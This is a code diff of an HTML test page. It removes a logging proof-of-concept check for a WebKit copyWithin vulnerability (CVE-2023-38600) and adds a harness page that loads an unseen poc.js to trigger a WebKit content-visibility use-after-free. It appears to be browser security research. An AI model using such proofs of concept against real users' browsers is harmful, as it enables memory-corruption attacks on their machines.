@@ -1,42 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CVE-2023-38600 WebKit copyWithin PoC (Safe)</title>
   <meta charset="UTF-8">
+  <title>WebKit content-visibility UAF PoC</title>
+  <style>
+    .container {
+      width: 200px;
+      height: 200px;
+      border: 2px solid black;
+      margin: 40px;
+    }
+    .child {
+      width: 100px;
+      height: 100px;
+      background: blue;
+      margin: 40px;
+    }
+    #log {
+      font-family: monospace;
+      background: #eee;
+      padding: 10px;
+      min-height: 60px;
+      margin: 20px 0;
+    }
+  </style>
 </head>
 <body>
-<h1>CVE-2023-38600 (WebKit copyWithin) Proof of Concept</h1>
-<pre id="log"></pre>
-<script>
-function log(msg) {
-  document.getElementById('log').textContent += msg + "\n";
-}
-
-try {
-  let arr = [1.1, 2.2, 3.3, 4.4];
-  let crafted = null;
-
-  arr.constructor = function() {
-    crafted = new Float64Array(8);
-    log("[*] Custom constructor called, returning crafted Float64Array: " + crafted);
-    return crafted;
-  };
-
-  log("[*] Before copyWithin, arr: " + arr);
-
-  arr.copyWithin(1, 2, 3);
-
-  log("[*] After copyWithin, arr: " + arr);
-
-  if (crafted) {
-    log("[*] Crafted array contents: " + Array.from(crafted));
-    log("[*] If you see abnormal output or a crash, this browser is likely vulnerable to CVE-2023-38600.");
-  } else {
-    log("[!] Custom constructor was NOT called. This browser is likely NOT vulnerable to CVE-2023-38600, or mitigation is present.");
-  }
-} catch (e) {
-  log("[!] Exception: " + e);
-}
-</script>
+  <h1>WebKit content-visibility UAF PoC</h1>
+  <div class="container">
+    <div class="child"></div>
+  </div>
+  <div id="log"></div>
+  <button onclick="import('./poc.js').then(m => m.triggerUAF())">Trigger UAF</button>
+  <script type="module">
+    import "./poc.js";
+  </script>
 </body>
 </html>
